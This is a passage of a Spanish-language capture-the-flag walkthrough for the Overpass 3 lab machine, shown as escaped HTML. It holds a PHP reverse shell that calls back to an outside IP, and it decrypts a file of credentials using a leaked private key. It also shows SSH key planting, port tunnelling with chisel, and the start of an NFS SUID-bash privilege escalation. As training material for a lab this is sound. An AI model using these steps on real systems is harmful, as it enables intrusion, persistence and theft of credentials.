Length: &lt;span class=&#34;m&#34;&gt;13353&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;13K&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;application/zip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Saving to: ‘backup.zip’

backup.zip                                                  100%&lt;span class=&#34;o&#34;&gt;[========================================================================================================================================&lt;/span&gt;&amp;gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  13.04K  50.1KB/s    in 0.3s    

2021-01-11 20:18:32 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;50.1 KB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; - ‘backup.zip’ saved &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;13353/13353&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

kali@kali:~/thm/overpass3$ unzip backup.zip 
Archive:  backup.zip
 extracting: CustomerDetails.xlsx.gpg  
  inflating: priv.key                
kali@kali:~/thm/overpass3$ ls
allPorts  backup.zip  CustomerDetails.xlsx.gpg  priv.key  servicePorts
kali@kali:~/thm/overpass3$ cat priv.key 
-----BEGIN PGP PRIVATE KEY BLOCK-----

lQOYBF+oX7cBCADhibQ/m0CUX0DKreNOMaBiG6YNrkaRd5XKFfZ8cO+JbE57Yuao
T3uhxN396ICsRBG7VGK03YZVwafMFxx0ItIEuV8n9nQ9K6WJg6od815J3UkkSMU4
TL6E+iGiAvYUtxwo2s/NqAdrUcAqoa9ImUxqHjJByNNpLbTcfKJKzZZEdVH6Iuo7
qLoKwNJLK427CpDqTFJmOLoRVH9XDSMaVaP5MT4qn18/iSJGpFJY/Qjv2RdgygiS
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... SNIP ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Aj7qgO6j7r2GkMwPiVlXQRW/dnhtNzvaS1ZR47R7YeFQuIIFiWnt+mamWrM3TN8x
5yeHVycXbFyRO121lKB0/q7f9dVFN8UY92F5cfMPUAOjM59P8Nsx3rFLUAhi7Fyo
5YeN91WwbAtRyc33YmwK/SpOVarOOdEvrGFK2z1Tq++RpqzuYFfnZ868NXJP+99Q
wR1fzkFAFjEZIO+bteZLEzr9BCUI7FAyQofXMggwiuyuw/Prcema52nhJvA&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;mr8q
-----END PGP PRIVATE KEY BLOCK-----
kali@kali:~/thm/overpass3$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Importamos la clave y desencriptamos el archivo, este ultimo contiene Nombres, usuarios, contraseñas e informacion de tarjetas de &amp;ldquo;credito&amp;rdquo;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/overpass3$ gpg --import priv.key 
gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
gpg: key C9AE71AB3180BC08: public key &lt;span class=&#34;s2&#34;&gt;&amp;#34;Paradox &amp;lt;paradox@overpass.thm&amp;gt;&amp;#34;&lt;/span&gt; imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
gpg:               imported: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
gpg:       secret keys read: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
gpg:   secret keys imported: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
kali@kali:~/thm/overpass3$ gpg -d CustomerDetails.xlsx.gpg &amp;gt; file.xlsx
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      &lt;span class=&#34;s2&#34;&gt;&amp;#34;Paradox &amp;lt;paradox@overpass.thm&amp;gt;&amp;#34;&lt;/span&gt;
kali@kali:~/thm/overpass3$ file file.xlsx 
file.xlsx: Microsoft Excel 2007+
kali@kali:~/thm/overpass3$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass3/Screenshot_20210111_192715.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;ftp&#34;&gt;FTP&lt;/h1&gt;
&lt;p&gt;Con las credenciales que encontramos intentamos ingresar por el servicio FTP donde logramos ver los archivos de la pagina y comprobar que tenemos permisos (con el primer usuario) de escritura, es por ello que comprobamos que el archivo &lt;code&gt;shinji.php&lt;/code&gt; se muestra en la pagina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/overpass3$ ftp overpass.thm 
Connected to overpass.thm.
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;overpass.thm:kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SPOILER&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
Password:
&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -lah
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
drwxrwxrwx    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;48&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;48&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;94&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 23:54 .
drwxrwxrwx    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;48&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;48&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;94&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 23:54 ..
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;48&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;48&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt; 21:25 backups
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;           &lt;span class=&#34;m&#34;&gt;65591&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 20:42 hallway.jpg
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;1770&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 20:42 index.html
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;576&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 20:42 main.css
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;2511&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 20:42 overpass.svg
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;257&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt; is the current directory
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; backups
&lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; Directory successfully changed.
ftp&amp;gt; ls -lah
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;48&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;48&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt; 21:25 .
drwxrwxrwx    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;48&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;48&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;94&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 23:54 ..
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;48&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;48&lt;/span&gt;          &lt;span class=&#34;m&#34;&gt;13353&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt; 21:24 backup.zip
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ..
&lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; Directory successfully changed.
ftp&amp;gt; put shinji.php
local: shinji.php remote: shinji.php
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Ok to send data.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; bytes sent in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;305.1758 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass3/Screenshot_20210111_193857.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;apache---user&#34;&gt;APACHE - USER&lt;/h1&gt;
&lt;p&gt;Subimos una shell inversa (ya que el servicio SSH no nos permitió ingresar), la &amp;ldquo;ejecutamos&amp;rdquo; y logramos obtener una shell con el usuario &lt;code&gt;Apache&lt;/code&gt; y nuestra flag &lt;code&gt;web.flag&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php:shinji.php&#34; data-lang=&#34;php:shinji.php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/1338 0&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass3/Screenshot_20210111_194236.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass3/Screenshot_20210111_200056.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;paradox---user&#34;&gt;PARADOX - USER&lt;/h1&gt;
&lt;p&gt;Utilizando la contraseña de &lt;code&gt;paradox&lt;/code&gt; logramos obtener una shell con este utilizando &lt;code&gt;su&lt;/code&gt;, pero al parecer la consola esta &amp;ldquo;limitada&amp;rdquo; por lo que agregamos nuestra clave publica al archivo &lt;code&gt;authorized_keys&lt;/code&gt; para poder ingresar por el servicio SSH y obtener una shell más comoda.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
/home/paradox/.ssh
ls -lah
total 8.0K
drwx------  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; paradox paradox  &lt;span class=&#34;m&#34;&gt;47&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 18:32 .
drwx------. &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; paradox paradox &lt;span class=&#34;m&#34;&gt;203&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 18:29 ..
-rw-------  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; paradox paradox &lt;span class=&#34;m&#34;&gt;583&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 18:29 authorized_keys
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; paradox paradox &lt;span class=&#34;m&#34;&gt;583&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 18:29 id_rsa.pub
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ssh-rsa AAAAB3NzaC1yc2EAAAAD[... snip ...]EA8NHz17TjX/NsxObr9Q6ziiRgIc= kali@kali&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; authorized_keys

tail authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;8NHz17TjX/NsxObr9Q6ziiRgIc&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; kali@kali
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass3/Screenshot_20210111_195737.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;james-nfs---user&#34;&gt;JAMES NFS - USER&lt;/h1&gt;
&lt;p&gt;Enumeramos la maquina y encontramos puertos &lt;strong&gt;locales&lt;/strong&gt; que no aparecen abiertos en &lt;em&gt;nmap&lt;/em&gt; o aparecen &lt;em&gt;filtrados&lt;/em&gt;, puertos que pertenecen RPC (111), NFS (2049) y MOUNTD (20048), al revisar si existia un punto de acceso encontramos la carpeta principal de James: &lt;code&gt;/home/james&lt;/code&gt;, y que, cualquiera tiene acceso. Pero existe un problema, estos puertos solo estan disponibles de manera local y para montar este punto de acceso es necesario privilegios root, es por eso que debemos de llevar estos puertos a nuestra maquina para poder montar el punto de acceso, poder listar y montarlo tal cual como lo muestra &lt;code&gt;showmount -e&lt;/code&gt; dentro de la maquina (&lt;code&gt;/home/james&lt;/code&gt;). Para ello utilizamos &lt;code&gt;chisel&lt;/code&gt; (ya que SSH no me permitia obtener el puerto 111) y &lt;code&gt;SSH&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass3/Screenshot_20210112_183435.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#CHISEL en Overpass&lt;/span&gt;
./chisel client 10.2.29.162:8080 R:111:127.0.0.1:111

&lt;span class=&#34;c1&#34;&gt;#Chisel en nuestra maquina&lt;/span&gt;
./chisel server -p &lt;span class=&#34;m&#34;&gt;8080&lt;/span&gt; --reverse

&lt;span class=&#34;c1&#34;&gt;#SSH en nuestra maquina&lt;/span&gt;
ssh -L 2049:127.0.0.1:2049 -L 20048:127.0.0.1:20048 paradox@overpass.thm
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;em&gt;En caso de que nuestra maquina no acepte el puerto 111 hay que parar el servicio rpcbind&lt;/em&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;systemctl stop rpcbind
systemctl stop rpcbind.socket
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Revisamos que los puertos estan localmente y que existe el punto de acceso con &lt;code&gt;showmount&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass3/Screenshot_20210112_195629.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Creamos una carpeta, montamos el punto de acceso con &lt;code&gt;mount&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Creamos una carpeta&lt;/span&gt;
mkdir jamesstuff

&lt;span class=&#34;c1&#34;&gt;#MOUNT&lt;/span&gt;
sudo mount -o nolock -t nfs localhost:/home/james /home/kali/thm/overpass3/jamesstuff/
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logramos obtener acceso a los archivos de &lt;code&gt;James&lt;/code&gt;, nuestra flag &lt;code&gt;user.txt&lt;/code&gt; y su clave privada de SSH la cual utilizamos para obtener una shell con este usuario.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass3/Screenshot_20210112_195818.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass3/Screenshot_20210112_200016.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Ya que tenemos acceso a la carpeta de &lt;code&gt;James&lt;/code&gt; a traves de NFS vamos a copiar &lt;code&gt;bash&lt;/code&gt; con permisos root o SUID.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cp /bin/bash .
chmod +s bash
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
